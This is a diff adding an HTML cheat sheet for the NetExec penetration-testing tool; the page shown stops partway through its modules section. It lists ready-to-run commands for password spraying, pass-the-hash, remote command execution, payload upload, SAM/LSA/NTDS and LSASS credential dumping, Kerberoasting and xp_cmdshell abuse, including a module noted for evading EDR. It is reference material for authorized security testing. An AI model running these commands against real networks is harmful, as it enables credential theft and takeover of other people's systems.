@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NetExec (nxc) Cheat Sheet</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; scroll-padding-top: 60px; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+    background: #0d1117;
+    color: #c9d1d9;
+    line-height: 1.55;
+    font-size: 14px;
+  }
+  header {
+    background: linear-gradient(135deg, #161b22 0%, #1c2128 100%);
+    padding: 32px 24px;
+    border-bottom: 1px solid #30363d;
+  }
+  header h1 {
+    font-size: 30px;
+    color: #3fb950;
+    font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Courier New', monospace;
+    letter-spacing: -0.5px;
+  }
+  header .sub {
+    color: #8b949e;
+    margin-top: 10px;
+    font-size: 14px;
+    max-width: 900px;
+  }
+  header .pill {
+    display: inline-block;
+    background: #21262d;
+    color: #3fb950;
+    padding: 3px 10px;
+    border-radius: 12px;
+    font-size: 12px;
+    margin-right: 6px;
+    margin-top: 10px;
+    font-family: 'SF Mono', monospace;
+  }
+  nav {
+    background: #161b22;
+    border-bottom: 1px solid #30363d;
+    padding: 12px 24px;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    overflow-x: auto;
+    white-space: nowrap;
+  }
+  nav a {
+    color: #58a6ff;
+    text-decoration: none;
+    margin-right: 16px;
+    font-size: 13px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    transition: background 0.15s;
+    font-family: 'SF Mono', monospace;
+  }
+  nav a:hover { background: #21262d; color: #79c0ff; }
+  main {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 32px 24px 80px;
+  }
+  section { margin-bottom: 56px; }
+  section h2 {
+    color: #f0f6fc;
+    font-size: 24px;
+    border-bottom: 2px solid #3fb950;
+    padding-bottom: 8px;
+    margin-bottom: 20px;
+    font-family: 'SF Mono', Monaco, monospace;
+  }
+  section h2 .num {
+    color: #3fb950;
+    margin-right: 8px;
+    opacity: 0.7;
+  }
+  section h3 {
+    color: #f0f6fc;
+    font-size: 17px;
+    margin: 28px 0 12px;
+    padding-left: 12px;
+    border-left: 3px solid #58a6ff;
+  }
+  section h4 {
+    color: #d2a8ff;
+    font-size: 14px;
+    margin: 20px 0 8px;
+    font-family: 'SF Mono', monospace;
+  }
+  p, li { color: #c9d1d9; margin-bottom: 8px; }
+  p.note {
+    background: #161b22;
+    border-left: 3px solid #d29922;
+    padding: 10px 14px;
+    color: #e6edf3;
+    font-size: 13px;
+    margin: 12px 0;
+    border-radius: 4px;
+  }
+  p.warn {
+    background: #290e0e;
+    border-left: 3px solid #f85149;
+    padding: 10px 14px;
+    color: #ffdcd7;
+    font-size: 13px;
+    margin: 12px 0;
+    border-radius: 4px;
+  }
+  p.tip {
+    background: #0d2818;
+    border-left: 3px solid #3fb950;
+    padding: 10px 14px;
+    color: #b3f0c9;
+    font-size: 13px;
+    margin: 12px 0;
+    border-radius: 4px;
+  }
+  code, pre {
+    font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Courier New', monospace;
+  }
+  code {
+    background: #21262d;
+    color: #f0f6fc;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 13px;
+  }
+  pre {
+    background: #010409;
+    border: 1px solid #30363d;
+    border-left: 3px solid #3fb950;
+    padding: 14px 16px;
+    border-radius: 6px;
+    overflow-x: auto;
+    margin: 12px 0 18px;
+    font-size: 13px;
+    line-height: 1.6;
+    color: #e6edf3;
+  }
+  pre .cmt { color: #8b949e; font-style: italic; }
+  pre .flag { color: #d29922; }
+  pre .str { color: #a5d6ff; }
+  pre .cmd { color: #ff7b72; }
+  pre .var { color: #79c0ff; }
+  pre .kw { color: #d2a8ff; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 12px 0;
+    font-size: 13px;
+  }
+  th, td {
+    border: 1px solid #30363d;
+    padding: 8px 12px;
+    text-align: left;
+    vertical-align: top;
+  }
+  th {
+    background: #161b22;
+    color: #f0f6fc;
+    font-weight: 600;
+  }
+  td code { background: #010409; font-size: 12px; }
+  ul, ol { margin: 8px 0 12px 24px; }
+  ul li { margin-bottom: 4px; }
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+    gap: 12px;
+    margin: 14px 0;
+  }
+  .card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 6px;
+    padding: 14px 16px;
+  }
+  .card h5 {
+    color: #3fb950;
+    font-size: 13px;
+    font-family: 'SF Mono', monospace;
+    margin-bottom: 6px;
+  }
+  .card p {
+    font-size: 12px;
+    color: #8b949e;
+    margin: 0;
+  }
+  footer {
+    text-align: center;
+    color: #8b949e;
+    padding: 20px;
+    border-top: 1px solid #30363d;
+    font-size: 12px;
+    background: #161b22;
+  }
+  footer a { color: #58a6ff; }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>NetExec (nxc) Cheat Sheet</h1>
+  <div class="sub">The successor to CrackMapExec — the swiss-army knife for authenticated post-exploitation and network enumeration across SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP, WMI, NFS, and VNC.</div>
+  <div>
+    <span class="pill">smb</span>
+    <span class="pill">ldap</span>
+    <span class="pill">winrm</span>
+    <span class="pill">mssql</span>
+    <span class="pill">ssh</span>
+    <span class="pill">rdp</span>
+    <span class="pill">ftp</span>
+    <span class="pill">wmi</span>
+    <span class="pill">nfs</span>
+    <span class="pill">vnc</span>
+  </div>
+</header>
+
+<nav>
+  <a href="#basics">Basics</a>
+  <a href="#smb">SMB</a>
+  <a href="#ldap">LDAP</a>
+  <a href="#winrm">WinRM</a>
+  <a href="#mssql">MSSQL</a>
+  <a href="#ssh">SSH</a>
+  <a href="#other">Other</a>
+  <a href="#modules">Modules</a>
+  <a href="#kerberos">Kerberos</a>
+  <a href="#coercion">Coercion</a>
+  <a href="#workflows">Workflows</a>
+</nav>
+
+<main>
+
+<!-- ============ BASICS ============ -->
+<section id="basics">
+<h2><span class="num">01</span>Basics &amp; Global Flags</h2>
+
+<h3>Install / Update</h3>
+<pre><span class="cmt"># Kali (usually pre-installed)</span>
+<span class="cmd">sudo apt install netexec</span>
+
+<span class="cmt"># Latest from git (via pipx — recommended)</span>
+<span class="cmd">pipx install git+https://github.com/Pennyw0rth/NetExec</span>
+<span class="cmd">pipx upgrade netexec</span>
+
+<span class="cmt"># Check version and installed modules</span>
+<span class="cmd">nxc</span> <span class="flag">--version</span>
+<span class="cmd">nxc smb</span> <span class="flag">-L</span>            <span class="cmt"># list SMB modules</span></pre>
+
+<h3>Command shape</h3>
+<pre><span class="cmd">nxc</span> <span class="kw">PROTOCOL</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">USER</span> <span class="flag">-p</span> <span class="str">PASS</span> [<span class="flag">options</span>] [<span class="flag">-M</span> <span class="str">module</span>]</pre>
+
+<h3>Auth patterns</h3>
+<table>
+<tr><th>Type</th><th>Example</th></tr>
+<tr><td>Password</td><td><code>-u user -p 'Pass123'</code></td></tr>
+<tr><td>NT hash (PtH)</td><td><code>-H 31d6cfe0d16ae931b73c59d7e0c089c0</code></td></tr>
+<tr><td>Full LM:NT</td><td><code>-H aad3b435...:31d6cfe0...</code></td></tr>
+<tr><td>Domain</td><td><code>-d corp.local</code> (else use <code>--local-auth</code>)</td></tr>
+<tr><td>Kerberos (TGT in ccache)</td><td><code>--use-kcache</code> (respects <code>$KRB5CCNAME</code>)</td></tr>
+<tr><td>Kerberos (request new)</td><td><code>-k -u user -p pass</code></td></tr>
+<tr><td>AES key</td><td><code>--aesKey &lt;hex&gt;</code></td></tr>
+<tr><td>Null session</td><td><code>-u '' -p ''</code></td></tr>
+<tr><td>Guest</td><td><code>-u guest -p ''</code></td></tr>
+</table>
+
+<h3>Target formats</h3>
+<pre>10.10.10.100                <span class="cmt"># single IP</span>
+10.10.10.0/24               <span class="cmt"># CIDR</span>
+10.10.10.100-120            <span class="cmt"># range</span>
+targets.txt                 <span class="cmt"># file (one per line)</span>
+dc01.corp.local             <span class="cmt"># hostname / FQDN</span></pre>
+
+<h3>Handy global flags</h3>
+<table>
+<tr><td><code>--continue-on-success</code></td><td>Keep going after first hit — needed for password spraying</td></tr>
+<tr><td><code>--no-bruteforce</code></td><td>Stop trying more passwords for a user after first success</td></tr>
+<tr><td><code>-t 100</code></td><td>Threads (default 100)</td></tr>
+<tr><td><code>--jitter 5</code></td><td>Random 0–5s delay between requests</td></tr>
+<tr><td><code>-v / --verbose</code></td><td>More output</td></tr>
+<tr><td><code>--debug</code></td><td>Full noise for troubleshooting</td></tr>
+<tr><td><code>-M NAME -o KEY=VAL</code></td><td>Run module with options</td></tr>
+<tr><td><code>--log FILE</code></td><td>Log everything to a file</td></tr>
+</table>
+
+<p class="note"><strong>Database:</strong> results and creds are stored in <code>~/.nxc/</code>. Use <code>nxcdb</code> to query them later — very useful for tracking a large engagement.</p>
+
+</section>
+
+
+<!-- ============ SMB ============ -->
+<section id="smb">
+<h2><span class="num">02</span>SMB — the workhorse</h2>
+
+<h3>Basic auth check &amp; host recon</h3>
+<pre><span class="cmt"># Validate creds against a host or a whole subnet</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">'Pass123'</span>
+
+<span class="cmt"># Output tells you: hostname, domain, OS, SMB signing, SMBv1</span>
+<span class="cmt">#   SMB   10.10.10.5    445   DC01   [*] Windows Server 2019 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)</span>
+<span class="cmt">#   SMB   10.10.10.5    445   DC01   [+] corp.local\user:Pass123 (Pwn3d!)   ← Pwn3d! = local admin</span>
+
+<span class="cmt"># Null session — huge on old boxes</span>
+<span class="cmd">nxc smb</span> <span class="var">10.10.10.5</span> <span class="flag">-u</span> <span class="str">''</span> <span class="flag">-p</span> <span class="str">''</span></pre>
+
+<h3>Enumeration</h3>
+<pre><span class="cmt"># Shares (with read/write markers)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--shares</span>
+
+<span class="cmt"># Users, groups, computers, domain info</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--users</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--groups</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--computers</span>
+
+<span class="cmt"># Live sessions and logged-on users → target hunting</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--sessions</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--loggedon-users</span>
+
+<span class="cmt"># Password policy — plan your spraying without lockouts</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--pass-pol</span>
+
+<span class="cmt"># RID brute — enumerate users via null/guest session</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">guest</span> <span class="flag">-p</span> <span class="str">''</span> <span class="flag">--rid-brute</span> <span class="str">4000</span>
+
+<span class="cmt"># Disks / installed shares</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--disks</span></pre>
+
+<h3>Command execution (local admin required)</h3>
+<pre><span class="cmt"># Auto-picks the best exec method</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"whoami /priv"</span>
+
+<span class="cmt"># PowerShell (base64-encoded under the hood)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-X</span> <span class="str">"Get-Process | ft"</span>
+
+<span class="cmt"># Force a specific exec method: wmiexec / smbexec / atexec / mmcexec</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"whoami"</span> <span class="flag">--exec-method</span> <span class="str">smbexec</span>
+
+<span class="cmt"># Get a real interactive-ish shell via impacket instead</span>
+<span class="cmd">impacket-psexec</span> <span class="str">corp/user:pass@TARGET</span></pre>
+
+<p class="note"><strong>Exec method reminder:</strong> <code>psexec/smbexec/atexec</code> ride SMB pipes (only need 445). <code>wmiexec</code> needs dynamic RPC (135 + high port). If SMB works but WMI doesn't, dynamic RPC is filtered.</p>
+
+<h3>Credential dumps (local admin required)</h3>
+<pre><span class="cmt"># SAM hashes (local accounts)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--sam</span>
+
+<span class="cmt"># LSA secrets (cached domain creds, machine acct, autologon…)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--lsa</span>
+
+<span class="cmt"># NTDS.dit — DOMAIN CONTROLLER ONLY, or via DCSync rights</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--ntds</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--ntds</span> <span class="flag">--users</span>       <span class="cmt"># enabled users only</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--ntds</span> <span class="flag">--enabled</span>
+
+<span class="cmt"># DPAPI blobs (browser saved passwords, credential manager)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">admin</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--dpapi</span></pre>
+
+<h3>Files &amp; shares</h3>
+<pre><span class="cmt"># Upload / download</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--put-file</span> <span class="str">./payload.exe</span> <span class="str">C\$\\Temp\\payload.exe</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--get-file</span> <span class="str">C\$\\Users\\admin\\Desktop\\flag.txt</span> <span class="str">flag.txt</span>
+
+<span class="cmt"># Spider a share for interesting files (via module, more powerful)</span>
+<span class="cmd">nxc smb</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">spider_plus</span> <span class="flag">-o</span> <span class="str">EXCLUDE_DIRS=Windows,PerfLogs</span></pre>
+
+<h3>Password spraying</h3>
+<pre><span class="cmt"># Spray one password across many users (careful with lockouts)</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">users.txt</span> <span class="flag">-p</span> <span class="str">'Summer2026!'</span> <span class="flag">--continue-on-success</span>
+
+<span class="cmt"># Spray several passwords across several users</span>
+<span class="cmd">nxc smb</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">users.txt</span> <span class="flag">-p</span> <span class="str">passes.txt</span> <span class="flag">--continue-on-success</span> <span class="flag">--no-bruteforce</span></pre>
+
+<p class="warn"><strong>Lockout warning:</strong> always run <code>--pass-pol</code> first if you can. Sprays on a domain with <code>LockoutThreshold=3</code> will lock every account in the file. When in doubt, one carefully chosen password across all users beats multiple guesses per user.</p>
+
+</section>
+
+
+<!-- ============ LDAP ============ -->
+<section id="ldap">
+<h2><span class="num">03</span>LDAP — the AD enum goldmine</h2>
+
+<p>Anything you'd do with BloodHound / ldapsearch / <code>Get-ADUser</code> — nxc's LDAP protocol probably has a flag for it.</p>
+
+<h3>Basic AD enum</h3>
+<pre><span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--users</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--groups</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--active-users</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--admin-count</span>       <span class="cmt"># adminCount=1 (high-value)</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--dc-list</span>           <span class="cmt"># list all DCs</span></pre>
+
+<h3>Kerberoasting &amp; AS-REP roasting</h3>
+<pre><span class="cmt"># Kerberoast — dump TGS for any SPN account</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--kerberoasting</span> <span class="str">kerb.txt</span>
+
+<span class="cmt"># AS-REP roast — users with "Do not require Kerberos preauth"</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--asreproast</span> <span class="str">asrep.txt</span>
+
+<span class="cmt"># Crack:</span>
+<span class="cmd">hashcat</span> <span class="flag">-m</span> <span class="str">13100</span> <span class="var">kerb.txt</span> <span class="var">rockyou.txt</span>        <span class="cmt"># Kerberoast</span>
+<span class="cmd">hashcat</span> <span class="flag">-m</span> <span class="str">18200</span> <span class="var">asrep.txt</span> <span class="var">rockyou.txt</span>       <span class="cmt"># AS-REP</span></pre>
+
+<h3>Weak / risky account states</h3>
+<pre><span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--password-not-required</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--trusted-for-delegation</span>   <span class="cmt"># unconstrained delegation</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--find-delegation</span>         <span class="cmt"># constrained/RBCD too</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--gmsa</span>                     <span class="cmt"># readable gMSA passwords</span></pre>
+
+<h3>BloodHound collection</h3>
+<pre><span class="cmt"># Full collection to JSON — drop straight into BloodHound / BloodHound-CE</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> \
+    <span class="flag">--bloodhound</span> <span class="flag">--collection</span> <span class="str">All</span> <span class="flag">--dns-server</span> <span class="var">DC-IP</span></pre>
+
+<h3>LDAP signing &amp; channel binding</h3>
+<pre><span class="cmt"># Are LDAP signing / LDAPS channel binding required? (relay pre-req check)</span>
+<span class="cmd">nxc ldap</span> <span class="var">DC-IP</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">ldap-checker</span></pre>
+
+</section>
+
+
+<!-- ============ WINRM ============ -->
+<section id="winrm">
+<h2><span class="num">04</span>WinRM — clean shells</h2>
+<pre><span class="cmt"># Auth check (also confirms user is in "Remote Management Users" or local admin)</span>
+<span class="cmd">nxc winrm</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span>
+
+<span class="cmt"># Command / PS exec (no service, no dropped binary → quieter than psexec)</span>
+<span class="cmd">nxc winrm</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"whoami /all"</span>
+<span class="cmd">nxc winrm</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-X</span> <span class="str">"Get-LocalGroupMember Administrators"</span>
+
+<span class="cmt"># Pass-the-hash</span>
+<span class="cmd">nxc winrm</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-H</span> <span class="str">&lt;NTHASH&gt;</span>
+
+<span class="cmt"># Interactive shell → evil-winrm</span>
+<span class="cmd">evil-winrm</span> <span class="flag">-i</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">'pass'</span>
+<span class="cmd">evil-winrm</span> <span class="flag">-i</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-H</span> <span class="str">&lt;NTHASH&gt;</span></pre>
+
+<p class="tip"><strong>WinRM is default disabled on workstations.</strong> Servers often have it on for admin scripting. If port 5985/5986 is closed, that's why.</p>
+</section>
+
+
+<!-- ============ MSSQL ============ -->
+<section id="mssql">
+<h2><span class="num">05</span>MSSQL</h2>
+<pre><span class="cmt"># Auth check (SQL account)</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">'Password1'</span> <span class="flag">--local-auth</span>
+
+<span class="cmt"># Auth check (Windows integrated)</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-d</span> <span class="str">corp.local</span>
+
+<span class="cmt"># Run a T-SQL query</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-q</span> <span class="str">"SELECT @@version"</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-q</span> <span class="str">"SELECT name FROM sys.databases"</span>
+
+<span class="cmt"># OS command via xp_cmdshell (auto-enables if you have rights)</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"whoami"</span>
+
+<span class="cmt"># PowerShell one-liner</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-X</span> <span class="str">"whoami; hostname"</span>
+
+<span class="cmt"># Common modules</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">mssql_priv</span>       <span class="cmt"># check exec / impersonate paths</span>
+<span class="cmd">nxc mssql</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">sa</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-M</span> <span class="str">nanodump</span>         <span class="cmt"># LSASS via SQL</span></pre>
+
+<p class="note">MSSQL running as SYSTEM/NetworkService with <code>xp_cmdshell</code> = instant SYSTEM shell on the box. Even non-sysadmin accounts can sometimes exec via <code>EXECUTE AS</code> chains.</p>
+</section>
+
+
+<!-- ============ SSH ============ -->
+<section id="ssh">
+<h2><span class="num">06</span>SSH</h2>
+<pre><span class="cmt"># Password auth</span>
+<span class="cmd">nxc ssh</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span>
+
+<span class="cmt"># Key auth</span>
+<span class="cmd">nxc ssh</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">--key-file</span> <span class="str">id_rsa</span>
+
+<span class="cmt"># Command exec</span>
+<span class="cmd">nxc ssh</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"id; uname -a; sudo -l"</span>
+
+<span class="cmt"># Spray across a subnet with one password</span>
+<span class="cmd">nxc ssh</span> <span class="var">10.10.10.0/24</span> <span class="flag">-u</span> <span class="str">root</span> <span class="flag">-p</span> <span class="str">'toor'</span> <span class="flag">--continue-on-success</span></pre>
+</section>
+
+
+<!-- ============ OTHER PROTOCOLS ============ -->
+<section id="other">
+<h2><span class="num">07</span>Other protocols</h2>
+
+<h3>RDP (mostly credential validation)</h3>
+<pre><span class="cmd">nxc rdp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span>
+<span class="cmd">nxc rdp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-H</span> <span class="str">&lt;NTHASH&gt;</span>    <span class="cmt"># restricted admin mode</span>
+
+<span class="cmt"># Screenshot the login screen (recon a locked host)</span>
+<span class="cmd">nxc rdp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--screenshot</span></pre>
+
+<h3>FTP</h3>
+<pre><span class="cmd">nxc ftp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">anonymous</span> <span class="flag">-p</span> <span class="str">''</span>
+<span class="cmd">nxc ftp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--ls</span> <span class="str">/</span>
+<span class="cmd">nxc ftp</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">--get</span> <span class="str">file.txt</span></pre>
+
+<h3>NFS</h3>
+<pre><span class="cmt"># List exports (no auth) + enum</span>
+<span class="cmd">nxc nfs</span> <span class="var">TARGET</span>
+<span class="cmd">nxc nfs</span> <span class="var">TARGET</span> <span class="flag">--enum-shares</span>
+<span class="cmd">nxc nfs</span> <span class="var">TARGET</span> <span class="flag">--list-contents</span> <span class="flag">--share</span> <span class="str">/exports/home</span></pre>
+
+<h3>WMI</h3>
+<pre><span class="cmt"># Runs over DCOM — needs 135 + dynamic RPC reachable</span>
+<span class="cmd">nxc wmi</span> <span class="var">TARGET</span> <span class="flag">-u</span> <span class="str">user</span> <span class="flag">-p</span> <span class="str">pass</span> <span class="flag">-x</span> <span class="str">"whoami"</span></pre>
+
+<h3>VNC</h3>
+<pre><span class="cmd">nxc vnc</span> <span class="var">TARGET</span> <span class="flag">-p</span> <span class="str">password</span></pre>
+</section>
+
+
+<!-- ============ MODULES ============ -->
+<section id="modules">
+<h2><span class="num">08</span>Modules that punch above their weight</h2>
+
+<p>List every module for a protocol with <code>-L</code>. Show a specific module's options with <code>-M name --options</code>. Pass options with <code>-o KEY=VAL</code>.</p>
+<pre><span class="cmd">nxc smb</span> <span class="flag">-L</span>
+<span class="cmd">nxc smb</span> <span class="flag">-M</span> <span class="str">gpp_password</span> <span class="flag">--options</span></pre>
+
+<h3>Credential loot</h3>
+<div class="card-grid">
+  <div class="card"><h5>gpp_password</h5><p>Decrypt legacy Groups.xml <code>cpassword</code> values from SYSVOL (pre-MS14-025 leftovers).</p></div>
+  <div class="card"><h5>gpp_autologin</h5><p>Pull auto-logon credentials from Registry.xml in GPO.</p></div>
+  <div class="card"><h5>laps</h5><p>Read LAPS-managed local admin passwords (needs read rights on the attribute).</p></div>
+  <div class="card"><h5>lsassy</h5><p>Dump LSASS remotely and parse creds — the classic post-admin move.</p></div>
+  <div class="card"><h5>nanodump</h5><p>Stealthier LSASS dump using nanodump technique.</p></div>
+  <div class="card"><h5>procdump</h5><p>Sysinternals-flavoured LSASS dump.</p></div>
+  <div class="card"><h5>handlekatz</h5><p>Duplicate LSASS handles + dump; frequently bypasses EDR that hooks OpenProcess.</p></div>
+  <div class="card"><h5>mimikatz</h5><p>Run mimikatz commands remotely (loud).</p></div>
+  <div class="card"><h5>masky</h5><p>Abuse ADCS to retrieve NT hashes for domain users via PKINIT.</p></div>
